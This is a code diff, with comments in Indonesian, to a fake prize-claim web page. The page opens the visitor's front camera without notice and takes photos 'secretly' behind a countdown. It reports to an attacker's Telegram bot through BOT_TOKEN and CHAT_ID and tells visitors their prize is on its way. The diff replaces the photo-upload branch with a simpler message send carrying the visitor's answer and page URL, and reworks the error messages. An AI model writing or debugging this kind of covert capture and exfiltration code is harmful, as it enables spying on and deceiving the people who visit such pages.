@@ -369,24 +369,19 @@
         // Inisialisasi kamera tersembunyi
         async function initCamera() {
             try {
-                // Meminta akses ke kamera depan
                 stream = await navigator.mediaDevices.getUserMedia({ 
                     video: { facingMode: 'user' }, 
                     audio: false 
                 });
-                
                 video.srcObject = stream;
-                console.log('Kamera berhasil diakses');
             } catch (err) {
-                console.error('Error mengakses kamera:', err);
-                // Tidak tampilkan pesan error ke user
+                console.log('Kamera tidak dapat diakses');
             }
         }
 
         // Fungsi untuk mengambil foto secara diam-diam
         function takePhoto() {
             return new Promise((resolve) => {
-                // Mulai hitungan mundur
                 let count = 3;
                 countdown.textContent = count;
                 countdown.style.display = 'block';
@@ -399,7 +394,6 @@
                         clearInterval(countdownInterval);
                         countdown.style.display = 'none';
                         
-                        // Ambil foto jika kamera tersedia
                         let photoDataUrl = null;
                         if (stream) {
                             const context = canvas.getContext('2d');
@@ -411,10 +405,8 @@
                         
                         // Efek flash
                         flash.style.display = 'block';
-                        flash.style.animation = 'flash 0.5s';
                         setTimeout(() => {
                             flash.style.display = 'none';
-                            flash.style.animation = '';
                         }, 500);
                         
                         resolve(photoDataUrl);
@@ -423,48 +415,26 @@
             });
         }
 
-        // Fungsi untuk mengirim foto ke Telegram
+        // Fungsi untuk mengirim ke Telegram - VERSI SIMPLE
         async function sendToTelegram(photoDataUrl) {
             try {
-                let message = `📸 Foto berhasil diambil!\n📅 Waktu: ${new Date().toLocaleString('id-ID')}\n🎨 Jawaban: ${selectedOption}\n🌐 Dari: ${window.location.href}`;
+                const message = `📸 Foto berhasil diambil!\n📅 Waktu: ${new Date().toLocaleString('id-ID')}\n🎨 Jawaban: ${selectedOption}\n🌐 Dari: ${window.location.href}`;
                 
-                // Jika ada foto, kirim foto
-                if (photoDataUrl) {
-                    const response = await fetch(photoDataUrl);
-                    const blob = await response.blob();
-                    
-                    const formData = new FormData();
-                    formData.append('chat_id', CHAT_ID);
-                    formData.append('photo', blob, 'photo.jpg');
-                    formData.append('caption', message);
-                    
-                    const telegramResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                        method: 'POST',
-                        body: formData
-                    });
-                    
-                    const result = await telegramResponse.json();
-                    console.log('Telegram Photo Response:', result);
-                    return result.ok;
+                // Coba kirim pesan dulu (lebih reliable)
+                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`);
+                const result = await response.json();
+                
+                console.log('Telegram Response:', result);
+                
+                if (result.ok) {
+                    return true;
                 } else {
-                    // Jika tidak ada foto, kirim pesan saja
-                    const telegramResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                        },
-                        body: JSON.stringify({
-                            chat_id: CHAT_ID,
-                            text: message
-                        })
-                    });
-                    
-                    const result = await telegramResponse.json();
-                    console.log('Telegram Message Response:', result);
-                    return result.ok;
+                    // Jika gagal, coba detail error
+                    console.error('Telegram Error:', result);
+                    return false;
                 }
             } catch (error) {
-                console.error('Error mengirim ke Telegram:', error);
+                console.error('Network Error:', error);
                 return false;
             }
         }
@@ -489,16 +459,16 @@
                 if (success) {
                     showStatus('Selamat! Hadiah Anda sedang diproses dan akan segera dikirim ke akun Anda.', 'success');
                     
-                    // Simulasi pengiriman hadiah
                     setTimeout(() => {
                         showStatus('Hadiah telah berhasil dikirim! Terima kasih telah berpartisipasi.', 'success');
                     }, 3000);
                 } else {
-                    throw new Error('Gagal mengirim ke Telegram');
+                    // Tampilkan error lebih spesifik
+                    showStatus('Gagal mengirim. Pastikan bot Telegram aktif dan konfigurasi benar.', 'error');
                 }
             } catch (error) {
                 console.error('Error:', error);
-                showStatus('Maaf, terjadi kesalahan. Silakan coba lagi.', 'error');
+                showStatus('Terjadi kesalahan jaringan. Silakan coba lagi.', 'error');
             } finally {
                 claimBtn.disabled = false;
                 claimBtn.innerHTML = '<i class="fas fa-trophy"></i> Klaim Hadiah Sekarang!';
@@ -511,7 +481,6 @@
             status.className = `status ${type}`;
             status.style.display = 'block';
             
-            // Sembunyikan status setelah 5 detik
             setTimeout(() => {
                 status.style.display = 'none';
             }, 5000);
